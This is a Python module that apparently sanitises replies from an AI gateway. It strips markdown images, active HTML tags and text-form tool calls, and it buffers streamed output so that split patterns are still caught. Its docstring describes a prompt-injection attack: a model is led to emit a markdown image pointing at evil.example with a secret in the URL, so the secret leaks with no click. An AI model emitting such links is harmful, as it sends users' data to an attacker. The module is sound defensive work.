"""Neutralise model output that could leak data without any user action.

A prompt-injected model can be told to write `![x](https://evil.example/?d=<secret>)`. A chat UI
that renders it fetches the URL on its own, so the secret leaves with no click. We remove markdown
images and active HTML tags (img, iframe, script, ...) from every reply the gateway returns, on
both lanes, in streaming and non-streaming form. Ordinary links stay, because they need a click.
"""
from __future__ import annotations

import re
from typing import Tuple

_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)|!\[[^\]]*\]\[[^\]]*\]")
_HTML_ACTIVE = re.compile(
    r"<\s*/?\s*(?:img|iframe|script|object|embed|link|style|video|audio|source|svg|meta|base|form)\b[^>]*>?",
    re.IGNORECASE)
_TOOL_CALL_TEXT = re.compile(r"<tool_call>.*?(?:</tool_call>|$)", re.DOTALL | re.IGNORECASE)
IMAGE_MARK = "[image removed]"
MAX_HOLD = 2000


def strip_active_content(text: str) -> Tuple[str, int]:
    """Return (clean text, number of removals)."""
    n = 0

    def sub(pattern, repl, s):
        nonlocal n
        s, k = pattern.subn(repl, s)
        n += k
        return s
    text = sub(_MD_IMAGE, IMAGE_MARK, text)
    text = sub(_HTML_ACTIVE, "", text)
    return text, n


def strip_text_tool_calls(text: str) -> Tuple[str, int]:
    """Tool calls written as text (<tool_call>{...}</tool_call>) are never executed by anyone we
    control, so they are removed rather than passed to a client that might parse them."""
    return _TOOL_CALL_TEXT.subn("", text)[0], len(_TOOL_CALL_TEXT.findall(text))


def sanitize_reply(text: str) -> Tuple[str, int]:
    text, a = strip_text_tool_calls(text)
    text, b = strip_active_content(text)
    return text, a + b


def _could_still_become_match(tail: str) -> bool:
    """True if `tail` (starting at '!' or '<') is an unfinished prefix of something we strip."""
    if len(tail) > MAX_HOLD:
        return False
    if tail[0] == "!":
        if len(tail) == 1:
            return True
        if tail[1] != "[":
            return False
        close = tail.find("]")
        if close == -1:
            return True
        if close + 1 == len(tail):
            return True                      # "![alt]" - next char decides
        nxt = tail[close + 1]
        if nxt == "(":
            return ")" not in tail[close + 2:]
        if nxt == "[":
            return "]" not in tail[close + 2:]
        return False
    if tail[0] == "<":
        return ">" not in tail
    return False


class StreamSanitizer:
    """Feed streamed text pieces in; get safe text out. Any suffix that might still turn into a
    stripped construct is held back until it resolves, so a pattern split across chunks is caught."""

    def __init__(self) -> None:
        self.buf = ""
        self.removed = 0

    def _emit(self, text: str) -> str:
        text, n = sanitize_reply(text)
        self.removed += n
        return text

    def feed(self, piece: str) -> str:
        self.buf += piece
        cut = len(self.buf)
        for m in re.finditer(r"[!<]", self.buf):
            if _could_still_become_match(self.buf[m.start():]):
                cut = m.start()
                break
        out, self.buf = self.buf[:cut], self.buf[cut:]
        return self._emit(out)

    def flush(self) -> str:
        out, self.buf = self.buf, ""
        return self._emit(out)
